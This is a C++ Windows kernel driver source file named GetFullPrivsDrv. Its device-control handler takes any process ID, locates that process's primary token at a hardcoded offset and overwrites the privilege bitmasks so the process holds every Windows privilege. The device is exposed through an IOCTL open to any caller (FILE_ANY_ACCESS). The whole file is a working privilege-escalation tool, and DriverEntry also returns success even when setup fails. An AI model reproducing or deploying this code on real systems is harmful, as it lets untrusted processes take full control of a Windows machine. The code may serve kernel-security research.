#include <ntifs.h>

#define DRIVER_PREFIX "GetFullPrivsDrv: "
#define DEVICE_PATH L"\\Device\\GetFullPrivs"
#define SYMLINK_PATH L"\\??\\GetFullPrivs"

// _SEP_TOKEN_PRIVILEGES was introduced since Windows Vista.
// The offset from _TOKEN have been fixed for now (Win 11 23H2).
// See https://www.vergiliusproject.com/kernels/x64/Windows%20Vista%20%7C%202008/RTM/_TOKEN
#define VALID_PRIVILEGE_MASK 0x0000001FFFFFFFFCULL
#define SEP_TOKEN_OFFSET 0x40

//
// Struct definition
//
typedef struct _SEP_TOKEN_PRIVILEGES
{
	ULONGLONG Present;
	ULONGLONG Enabled;
	ULONGLONG EnabledByDefault;
} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;

//
// Ioctl code definition
//
#define IOCTL_GET_ALL_PRIVS CTL_CODE(0x8000, 0x0200, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
// Prototypes
//
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);
NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp
);


//
// Driver routines
//
extern "C"
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  DriverObject,
	_In_ PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS ntstatus = STATUS_FAILED_DRIVER_ENTRY;
	PDEVICE_OBJECT pDeviceObject = nullptr;

	do
	{
		UNICODE_STRING devicePath{ 0 };
		UNICODE_STRING symlinkPath{ 0 };
		::RtlInitUnicodeString(&devicePath, DEVICE_PATH);
		::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);

		ntstatus = ::IoCreateDevice(
			DriverObject,
			NULL,
			&devicePath,
			FILE_DEVICE_UNKNOWN,
			NULL,
			FALSE,
			&pDeviceObject);

		if (!NT_SUCCESS(ntstatus))
		{
			pDeviceObject = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to create device (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		ntstatus = ::IoCreateSymbolicLink(&symlinkPath, &devicePath);

		if (!NT_SUCCESS(ntstatus))
		{
			KdPrint((DRIVER_PREFIX "Failed to create symbolic link (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}

		DriverObject->DriverUnload = DriverUnload;
		DriverObject->MajorFunction[IRP_MJ_CREATE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_CLOSE] = OnCreateClose;
		DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OnDeviceControl;

		KdPrint((DRIVER_PREFIX "Driver is loaded successfully.\n"));
	} while (false);

	if (!NT_SUCCESS(ntstatus) && (pDeviceObject != nullptr))
		::IoDeleteDevice(pDeviceObject);

	return false;
}


void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symlinkPath{ 0 };
	::RtlInitUnicodeString(&symlinkPath, SYMLINK_PATH);
	::IoDeleteSymbolicLink(&symlinkPath);
	::IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "Driver is unloaded.\n"));
}


NTSTATUS OnCreateClose(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_SUCCESS;
	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = 0u;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}


NTSTATUS OnDeviceControl(
	_Inout_ PDEVICE_OBJECT DeviceObject,
	_Inout_ PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS ntstatus = STATUS_INVALID_DEVICE_REQUEST;
	ULONG_PTR info = NULL;
	PIO_STACK_LOCATION irpSp = ::IoGetCurrentIrpStackLocation(Irp);
	auto& dic = irpSp->Parameters.DeviceIoControl;

	switch (dic.IoControlCode)
	{
	case IOCTL_GET_ALL_PRIVS:
		if (dic.InputBufferLength < sizeof(ULONG))
		{
			ntstatus = STATUS_BUFFER_TOO_SMALL;
			KdPrint((DRIVER_PREFIX "Input buffer is too small.\n"));
			break;
		}

		PEPROCESS pEprocess = nullptr;
		auto pid = ::ULongToHandle(*(ULONG*)Irp->AssociatedIrp.SystemBuffer);

		ntstatus = ::PsLookupProcessByProcessId(pid, &pEprocess);

		if (!NT_SUCCESS(ntstatus))
		{
			*(HANDLE*)Irp->AssociatedIrp.SystemBuffer = nullptr;
			KdPrint((DRIVER_PREFIX "Failed to PsLookupProcessByProcessId() (NTSTATUS = 0x%08X).\n", ntstatus));
			break;
		}
		else
		{
			PACCESS_TOKEN pPrimaryToken = ::PsReferencePrimaryToken(pEprocess);
			auto pSepToken = (PSEP_TOKEN_PRIVILEGES)((ULONG_PTR)pPrimaryToken + SEP_TOKEN_OFFSET);

			KdPrint((DRIVER_PREFIX "Primary token for PID %u is at %p.\n", ::HandleToULong(pid), pPrimaryToken));
			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is at %p.\n", ::HandleToULong(pid), pSepToken));

			pSepToken->Present = VALID_PRIVILEGE_MASK;
			pSepToken->Enabled = VALID_PRIVILEGE_MASK;
			pSepToken->EnabledByDefault = VALID_PRIVILEGE_MASK;

			::PsDereferencePrimaryToken(pPrimaryToken);
			ObDereferenceObject(pEprocess);

			KdPrint((DRIVER_PREFIX "_SEP_TOKEN_PRIVILEGES for PID %u is overwritten successfully.\n", HandleToULong(pid)));
		}
	}

	Irp->IoStatus.Status = ntstatus;
	Irp->IoStatus.Information = info;
	IoCompleteRequest(Irp, 0);

	return ntstatus;
}